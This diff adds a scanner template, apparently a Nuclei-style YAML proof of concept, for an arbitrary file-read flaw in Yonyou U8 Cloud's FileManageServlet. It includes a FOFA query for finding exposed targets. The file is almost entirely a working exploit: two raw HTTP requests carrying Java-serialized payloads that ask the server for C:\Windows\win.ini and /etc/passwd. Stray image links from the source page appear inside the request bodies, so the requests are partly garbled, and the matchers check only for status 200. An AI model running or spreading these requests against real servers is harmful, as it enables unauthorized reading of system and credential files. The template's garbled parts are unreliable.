@@ -1,0 +1,66 @@
+id: poc-nbsex393hhx0gra8
+info:
+  name: 用友U8 Cloud FileManageServlet存在任意文件读取(CNVD-2025-07265)
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nbsex393hhx0gra8'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: nbsex393hhx0gra8
+    fofa: title="U8C"
+http:
+- raw:
+  - 'POST /service/FileManageServlet HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: en-US,en;q=0.9
+
+    Connection: close
+
+    Content-Type: application/octet-stream
+
+
+    {{unquote("\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\x0aloadFactorI\x00\x09thresholdxp?@\x00\x00\x00\x00\x00\x0cw\x08\x00\x00\x00\x10\x00\x00\x00\x03t\x00\x04patht\x00\x12C:\\Windows\\win.init\x00\x06dsNamet\x00\x03plmt\x00\x08operTypet\x00\x0ddownloadlocalx")}}
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1749286612054-86dfabe0-b3b9-47d9-8f30-f4725d3b881a.png)
+
+    Linux'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /service/FileManageServlet HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: en-US,en;q=0.9
+
+    Connection: close
+
+    Content-Type: application/octet-stream
+
+
+    {{unquote("\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\x0aloadFactorI\x00\x09thresholdxp?@\x00\x00\x00\x00\x00\x0cw\x08\x00\x00\x00\x10\x00\x00\x00\x03t\x00\x04patht\x00\x0b/etc/passwdt\x00\x06dsNamet\x00\x03plmt\x00\x08operTypet\x00\x0ddownloadlocalx")}}
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1749286612284-e35b0439-234b-46ac-b44e-3db5178803bf.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
